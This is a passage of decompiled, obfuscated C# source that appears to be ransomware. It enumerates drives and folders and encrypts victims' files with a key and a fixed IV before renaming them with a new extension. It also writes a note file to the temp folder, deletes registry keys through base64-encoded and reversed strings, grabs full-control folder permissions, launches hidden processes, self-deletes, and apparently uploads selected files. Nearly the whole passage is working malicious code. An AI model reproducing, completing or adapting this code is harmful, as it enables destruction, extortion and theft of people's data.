!fileInfo.FullName.Contains(TyXSqILJGWkm))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(BKTddpEXUb) * 1024.0 * 1024.0 && ZfmtEkVSEoLZCTN == _0016(107396837))
						{
							list.Add(fileInfo.FullName);
							mfLmYHrCqaMceC(list, P_1, P_2, P_3, P_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && ZfmtEkVSEoLZCTN == _0016(107396997))
						{
							list.Add(fileInfo.FullName);
							mfLmYHrCqaMceC(list, P_1, P_2, P_3, P_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void riqJHGtUsgf()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(_0016(107387411));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!dSQQLmBsItoVm.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(_0016(107387390), _0016(107397110)).Replace(_0016(107387353), _0016(107387390))
					.Replace(_0016(107387344), _0016(107388361))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					dSQQLmBsItoVm.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(_0016(107387390), _0016(107397110)).Replace(_0016(107387353), _0016(107387390))
						.Replace(_0016(107387344), _0016(107388361))
						.Split(new char[1] { '(' })[0].Trim().Replace(_0016(107387371), _0016(107388361)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string MkUJPBjeBrD(string CcAvxqbjeAR = "", string hpkaPVPaxaoDTi = "")
	{
		string result = _0016(107388361);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = CcAvxqbjeAR,
				Arguments = hpkaPVPaxaoDTi,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void whdhjUDgfqKLT(string P_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = _0016(107387362),
			Arguments = P_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string XoauCcwIXoBdG(string P_0)
	{
		char[] array = P_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string KsnoBrbTQSaN(string P_0)
	{
		byte[] bytes = Convert.FromBase64String(P_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void pBYecYRZtlUM(string P_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = KsnoBrbTQSaN(_0016(107387313));
		processStartInfo.Arguments = _0016(107387284) + P_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool MPFYgxZgXwP(string P_0, string P_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(P_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(P_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(P_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string NMrXDqjSPVqJ(SecureString P_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(P_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void GNjgVGOIzcp()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string text = XoauCcwIXoBdG(_0016(107387279));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(KsnoBrbTQSaN(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386661)));
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386636)));
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386587)));
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386594)));
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107387313)));
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386569)));
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386540)));
					registryKey.Close();
				}
				text = XoauCcwIXoBdG(_0016(107386491));
				registryKey = Registry.LocalMachine.OpenSubKey(KsnoBrbTQSaN(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386906)));
					registryKey.Close();
				}
				text = XoauCcwIXoBdG(_0016(107386921));
				registryKey = Registry.LocalMachine.OpenSubKey(KsnoBrbTQSaN(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386906)));
					registryKey.Close();
				}
				text = XoauCcwIXoBdG(_0016(107386921));
				registryKey = Registry.CurrentUser.OpenSubKey(KsnoBrbTQSaN(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(KsnoBrbTQSaN(_0016(107386906)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107386872)), KsnoBrbTQSaN(_0016(107386887)));
			MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107386806)), KsnoBrbTQSaN(_0016(107386797)));
			MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107386806)), KsnoBrbTQSaN(_0016(107386139)));
			MkUJPBjeBrD(KsnoBrbTQSaN(_0016(107386110)), KsnoBrbTQSaN(_0016(107386061)));
		}
		catch
		{
		}
	}

	public static void NdxUyyyATtE(string P_0, byte[] P_1)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(KsnoBrbTQSaN(_0016(107386020)));
			using FileStream fileStream = new FileStream(P_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(P_1, 0, P_1.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void mkibrbCOqshi()
	{
		string text = XoauCcwIXoBdG(_0016(107385995));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(KsnoBrbTQSaN(text), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(KsnoBrbTQSaN(_0016(107386394)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void QgzadyGmZecBjF()
	{
		MkUJPBjeBrD(_0016(107396403), KsnoBrbTQSaN(_0016(107386361)));
		string text = KsnoBrbTQSaN(_0016(107385655));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = _0016(107387344) + text + _0016(107387344) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = _0016(107396403);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void HHXouuwktdLUSFk(string P_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(P_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(P_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(P_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(P_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107385590) + P_0 + _0016(107385581) + ex.Message + _0016(107396206));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string qgGdJmyvbjfjKJGn()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = _0016(107388361);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 0:
				text = _0016(107385520);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == _0016(107385547))) ? _0016(107385497) : _0016(107385538));
				break;
			case 90:
				text = _0016(107385492);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = _0016(107385487);
				break;
			case 4:
				text = _0016(107385506);
				break;
			case 5:
				text = ((version.Minor != 0) ? _0016(107385456) : _0016(107385465));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? _0016(107385944) : _0016(107385469)) : _0016(107385474)) : _0016(107385483));
				break;
			case 10:
				text = _0016(107385939);
				break;
			}
		}
		if (text != _0016(107388361))
		{
			text = _0016(107385934) + text;
			if (oSVersion.ServicePack != _0016(107388361))
			{
				text = text + _0016(107385953) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string uINUJIUsUOtlNg(string P_0)
	{
		string text = Path.GetTempPath() + _0016(107395315);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107395282)));
				streamWriter.WriteLine(_0016(107396206));
				streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107392888)));
				streamWriter.WriteLine(P_0);
				if (uDFeFGGkwluj)
				{
					streamWriter.WriteLine(_0016(107396206));
					streamWriter.WriteLine(KsnoBrbTQSaN(_0016(107392298)));
					streamWriter.WriteLine(wihATTbwYdHSl.MVogxnZmiDFB());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(P_0) && !OmLPyoScyL)
				{
					File.AppendAllText(text, _0016(107392265) + P_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (QCmKQKwvWBrFEj)
			{
				try
				{
					File.AppendAllText(hBPcxbXfrBbYZwL, _0016(107385916) + ex.Message + _0016(107396206));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void NNPLhsJMYMb(string[] P_0, string[] P_1, string[] P_2, string P_3, string P_4)
	{
		AuEkQSfAmTdNp.GkwaWtjWFEcNJ CS_0024_003C_003E8__locals0 = new AuEkQSfAmTdNp();
		CS_0024_003C_003E8__locals0.HDKGEpCUCuNRunQh = P_1;
		CS_0024_003C_003E8__locals0.GHvyUUGUTGzxFxiI = P_2;
		CS_0024_003C_003E8__locals0.YAhCdHbkNsVH = P_3;
		CS_0024_003C_003E8__locals0.ynYNwNLpFIFm = P_4;
		JgtXDzoKBYSkMTJ = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.YAhCdHbkNsVH);
		DriveInfo[] array = null;
		if (P_0[0] == _0016(107396486))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !dSQQLmBsItoVm.Contains(array[i].Name))
					{
						dSQQLmBsItoVm.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < P_0.Length; j++)
			{
				if (!dSQQLmBsItoVm.Contains(P_0[j]))
				{
					dSQQLmBsItoVm.Add(P_0[j]);
				}
			}
		}
		if (dSQQLmBsItoVm.Contains(KsnoBrbTQSaN(_0016(107385891))) && TAqzrCZOZCbktGxO == _0016(107396837))
		{
			dSQQLmBsItoVm.Remove(KsnoBrbTQSaN(_0016(107385891)));
		}
		Parallel.ForEach(dSQQLmBsItoVm, delegate(string P_0)
		{
			CS_0024_003C_003E8__locals0 = new AuEkQSfAmTdNp.GkwaWtjWFEcNJ();
			CS_0024_003C_003E8__locals0.ocRkDXvnboX = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.woijyXwCWvycm = P_0;
			if (aNXCscvybLN && !qgGdJmyvbjfjKJGn().Contains(AuEkQSfAmTdNp._0012(107385466)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						MPFYgxZgXwP(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.woijyXwCWvycm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (CWdRZmKsDhxK == AuEkQSfAmTdNp._0012(107396847))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					zgTbjjevQpdHp(CS_0024_003C_003E8__locals0.woijyXwCWvycm, CS_0024_003C_003E8__locals0.ocRkDXvnboX.HDKGEpCUCuNRunQh, CS_0024_003C_003E8__locals0.ocRkDXvnboX.ynYNwNLpFIFm, CS_0024_003C_003E8__locals0.ocRkDXvnboX.GHvyUUGUTGzxFxiI, CS_0024_003C_003E8__locals0.ocRkDXvnboX.YAhCdHbkNsVH);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				zgTbjjevQpdHp(CS_0024_003C_003E8__locals0.woijyXwCWvycm, CS_0024_003C_003E8__locals0.HDKGEpCUCuNRunQh, CS_0024_003C_003E8__locals0.ynYNwNLpFIFm, CS_0024_003C_003E8__locals0.GHvyUUGUTGzxFxiI, CS_0024_003C_003E8__locals0.YAhCdHbkNsVH);
			}
		});
	}

	public static void zgTbjjevQpdHp(string P_0, string[] P_1, string P_2, string[] P_3, string P_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(_0016(107388361));
		List<string> list3 = list2;
		if (vnKnIgGgkpYwK == _0016(107396997))
		{
			list = jEnteCvESf(P_0, P_1, P_2, P_3, P_4);
			return;
		}
		list = UAHieNPKtXwJbEqUWn.SearchFiles(P_0);
		foreach (string text in P_1)
		{
			foreach (string item in list)
			{
				if (P_3.Length != 0)
				{
					foreach (string value in P_3)
					{
						if (item.EndsWith(value))
						{
							goto IL_039c;
						}
					}
				}
				if ((WGykFPOvUTVh == _0016(107396997) && !item.EndsWith(text)) || xaJTZrMmiQRAQ.Contains(item))
				{
					continue;
				}
				if (jyiNxqfYATtd == _0016(107396837))
				{
					try
					{
						if (FMLjGROaOe.dwqDkSuHLzr(item))
						{
							FMLjGROaOe.IxCKOOJCCsUF(item);
						}
					}
					catch
					{
					}
				}
				xaJTZrMmiQRAQ.Add(item);
				if (!aFoYhEArnYRtqzv.Contains(Path.GetDirectoryName(item)))
				{
					aFoYhEArnYRtqzv.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (ZgMAQkWlMGVlQB == _0016(107396837) && fileStream.Length > Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024 && !list3.Contains(text))
					{
						if (XLjwIPnIAHXCZ == _0016(107396837))
						{
							foreach (string item2 in qUoKxlxkuFsMOBYn)
							{
								if (item.ToLower().EndsWith(item2) && ASnTkTTzzlTA == _0016(107396837))
								{
									if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && ASnTkTTzzlTA == _0016(107396997))
								{
									try
									{
										wihATTbwYdHSl.FglfIgSlKdgC(_0016(107388410), _0016(107388405), _0016(107388424), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] array = ujXrqFZLIuhev.mYXsIDdSmNYSk(item, Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024);
						byte[] hgtQklihbol = ujXrqFZLIuhev.jsetmJbXIvBqD(array, Encoding.ASCII.GetBytes(P_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						ujXrqFZLIuhev.qervcdxCETqmk(item, hgtQklihbol);
						if (P_2 != _0016(107385850))
						{
							File.Move(item, item + P_2);
						}
					}
					else if (P_2 != _0016(107385850))
					{
						FWDWdunmLLq(item, item + P_2, JgtXDzoKBYSkMTJ);
					}
					else
					{
						FWDWdunmLLq(item, item + _0016(107385845), JgtXDzoKBYSkMTJ);
					}
				}
				catch (Exception)
				{
				}
				IL_039c:;
			}
		}
	}

	public static void mfLmYHrCqaMceC(List<string> P_0, string[] P_1, string P_2, string[] P_3, string P_4)
	{
		bFSgRwkHPWbo.hktBquzXjce CS_0024_003C_003E8__locals0 = new bFSgRwkHPWbo();
		CS_0024_003C_003E8__locals0.lJCScpebPQHSGPj = P_0;
		CS_0024_003C_003E8__locals0.UEavMcURXNKX = P_2;
		CS_0024_003C_003E8__locals0.fsyHihgcaeW = P_3;
		CS_0024_003C_003E8__locals0.SEgFdxrVdmAS = P_4;
		CS_0024_003C_003E8__locals0.jjHaVHCxepgMDqD = new List<string> { _0016(107388361) };
		if (WGykFPOvUTVh == _0016(107396997))
		{
			Parallel.ForEach(P_1, delegate(string P_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.lJCScpebPQHSGPj)
				{
					if (CS_0024_003C_003E8__locals0.fsyHihgcaeW.Length != 0)
					{
						string[] fsyHihgcaeW2 = CS_0024_003C_003E8__locals0.fsyHihgcaeW;
						int num2 = 0;
						while (num2 < fsyHihgcaeW2.Length)
						{
							string value2 = fsyHihgcaeW2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09d7;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.UEavMcURXNKX))
						{
							goto IL_09d7;
						}
					}
					catch (Exception)
					{
						goto IL_09d7;
					}
					if (item.EndsWith(P_0) && !xaJTZrMmiQRAQ.Contains(item))
					{
						if (jyiNxqfYATtd == bFSgRwkHPWbo._001A(107396855))
						{
							try
							{
								if (FMLjGROaOe.dwqDkSuHLzr(item))
								{
									FMLjGROaOe.IxCKOOJCCsUF(item);
								}
							}
							catch
							{
							}
						}
						xaJTZrMmiQRAQ.Add(item);
						if (!aFoYhEArnYRtqzv.Contains(Path.GetDirectoryName(item)))
						{
							aFoYhEArnYRtqzv.Add(Path.GetDirectoryName(item));
						}
						HHXouuwktdLUSFk(item);
						try
						{
							new KWOuChclelrn().OwONsISXXOOpf(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (IHUVFGfndtpl)
									{
										Console.WriteLine(bFSgRwkHPWbo._001A(107403230) + item + bFSgRwkHPWbo._001A(107403185) + new FileInfo(item).Length + bFSgRwkHPWbo._001A(107403164));
										Console.WriteLine(bFSgRwkHPWbo._001A(107403155));
									}
								}
								catch
								{
								}
								MkUJPBjeBrD(KsnoBrbTQSaN(bFSgRwkHPWbo._001A(107402506)), bFSgRwkHPWbo._001A(107387362) + item + bFSgRwkHPWbo._001A(107387362) + KsnoBrbTQSaN(bFSgRwkHPWbo._001A(107402513)) + bFSgRwkHPWbo._001A(107387362) + Environment.UserName + bFSgRwkHPWbo._001A(107387362) + KsnoBrbTQSaN(bFSgRwkHPWbo._001A(107402464)));
							}
						}
						catch (Exception ex18)
						{
							if (QCmKQKwvWBrFEj)
							{
								try
								{
									File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + item + bFSgRwkHPWbo._001A(107402439) + ex18.Message + bFSgRwkHPWbo._001A(107396224));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0)
								{
									goto end_IL_02ca;
								}
								goto end_IL_02ca_2;
								end_IL_02ca:;
							}
							catch (Exception ex20)
							{
								if (QCmKQKwvWBrFEj)
								{
									try
									{
										File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + item + bFSgRwkHPWbo._001A(107402390) + ex20.Message + bFSgRwkHPWbo._001A(107396224));
									}
									catch (Exception)
									{
									}
								}
								WetxdZxAdgUqT++;
								goto end_IL_02ca_2;
							}
							if (!(ZgMAQkWlMGVlQB == bFSgRwkHPWbo._001A(107396855)) || new FileInfo(item).Length <= Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024 || CS_0024_003C_003E8__locals0.jjHaVHCxepgMDqD.Contains(P_0))
							{
								if (uDFeFGGkwluj)
								{
									CS_0024_003C_003E8__locals0.UEavMcURXNKX = cshPaWeUxvVg + CS_0024_003C_003E8__locals0.UEavMcURXNKX;
								}
								string text3 = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
								string s3 = WvhZaNjlczTpSemA.ApMfxATNQTnF(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
								{
									if (!heKpdwyJrkK)
									{
										if (!OmLPyoScyL)
										{
											onQMKOyLMArp(item, item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, JgtXDzoKBYSkMTJ);
										}
										else
										{
											onQMKOyLMArp(item, item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!OmLPyoScyL)
											{
												sZrgcGPnICGjr(item, item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, JgtXDzoKBYSkMTJ);
											}
											else
											{
												sZrgcGPnICGjr(item, item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (QCmKQKwvWBrFEj)
											{
												try
												{
													File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + item + bFSgRwkHPWbo._001A(107385886) + ex22.Message + bFSgRwkHPWbo._001A(107396224));
												}
												catch (Exception)
												{
												}
											}
											WetxdZxAdgUqT++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02ca_2;
										}
									}
								}
								else if (!heKpdwyJrkK)
								{
									if (!OmLPyoScyL)
									{
										onQMKOyLMArp(item, item + bFSgRwkHPWbo._001A(107385863), JgtXDzoKBYSkMTJ);
									}
									else
									{
										onQMKOyLMArp(item, item + bFSgRwkHPWbo._001A(107385863), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!OmLPyoScyL)
										{
											sZrgcGPnICGjr(item, item, JgtXDzoKBYSkMTJ);
										}
										else
										{
											sZrgcGPnICGjr(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (QCmKQKwvWBrFEj)
										{
											try
											{
												File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + item + bFSgRwkHPWbo._001A(107385886) + ex25.Message + bFSgRwkHPWbo._001A(107396224));
											}
											catch (Exception)
											{
											}
										}
										WetxdZxAdgUqT++;
										goto end_IL_02ca_2;
									}
								}
								if (OmLPyoScyL)
								{
									if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
									{
										NdxUyyyATtE(item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, bytes3);
									}
									else
									{
										NdxUyyyATtE(item, bytes3);
									}
								}
								goto IL_09d7;
							}
							CS_0024_003C_003E8__locals0 = new bFSgRwkHPWbo.IBtzKJhlQtLvo();
							CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
								{
									if (uDFeFGGkwluj)
									{
										CS_0024_003C_003E8__locals0.UEavMcURXNKX = cshPaWeUxvVg + CS_0024_003C_003E8__locals0.UEavMcURXNKX;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.UEavMcURXNKX);
								}
							}
							catch (Exception ex27)
							{
								if (QCmKQKwvWBrFEj)
								{
									try
									{
										File.AppendAllText(hBPcxbXfrBbYZwL, bFSgRwkHPWbo._001A(107385608) + item + bFSgRwkHPWbo._001A(107402841) + ex27.Message + bFSgRwkHPWbo._001A(107396224));
									}
									catch (Exception)
									{
									}
								}
								WetxdZxAdgUqT++;
								goto end_IL_02ca_2;
							}
							CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH = bFSgRwkHPWbo._001A(107388379);
							if (CS_0024_003C_003E8__locals0.UEavMcURXNKX != bFSgRwkHPWbo._001A(107385868))
							{
								CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH = item + CS_0024_003C_003E8__locals0.UEavMcURXNKX;
							}
							else
							{
								CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH = item;
							}
							if (XLjwIPnIAHXCZ == bFSgRwkHPWbo._001A(107396855))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in qUoKxlxkuFsMOBYn)
									{
										if (CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.aHlKGcFnWxEbwtDO.UEavMcURXNKX) && ASnTkTTzzlTA == bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107396858))
										{
											if (Convert.ToInt32(UqzEWVXQurQ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH).Length)
											{
												try
												{
													wihATTbwYdHSl.FglfIgSlKdgC(bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107388431), bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107388426), bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107388445), CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH.ToLower().EndsWith(item2) && ASnTkTTzzlTA == bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107397018))
										{
											try
											{
												wihATTbwYdHSl.FglfIgSlKdgC(bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107388431), bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107388426), bFSgRwkHPWbo.IBtzKJhlQtLvo._0086(107388445), CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = FctLWdSYKGLPR.NCHlcfUWfflUhH(32);
							string s4 = WvhZaNjlczTpSemA.ApMfxATNQTnF(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (YtsYOxvPhpYvsqia == bFSgRwkHPWbo._001A(107397015))
							{
								byte[] array3 = null;
								byte[] array4 = ujXrqFZLIuhev.mYXsIDdSmNYSk(CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, Convert.ToInt32(phsLIEBLTPR) * 1024 * 1024);
								if (ujXrqFZLIuhev.qervcdxCETqmk(hgtQklihbol: (!LZWNsbTTjOGKx) ? (OmLPyoScyL ? ujXrqFZLIuhev.jsetmJbXIvBqD(array4, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ujXrqFZLIuhev.jsetmJbXIvBqD(array4, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OmLPyoScyL ? SORyNXckDwab.kxKjqVUBRvIzUxx(array4, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : SORyNXckDwab.kxKjqVUBRvIzUxx(array4, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.SEgFdxrVdmAS), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), JZMrFIOjlmFGmC: CS_0024_003C_003E8__locals0.BeiPpNheYGIBoJsVXH, LtdxxvPkxj: bytes4))
								{
									goto IL_09d7;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.UEavMcURXNKX, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!OmLPyoScyL)
							{
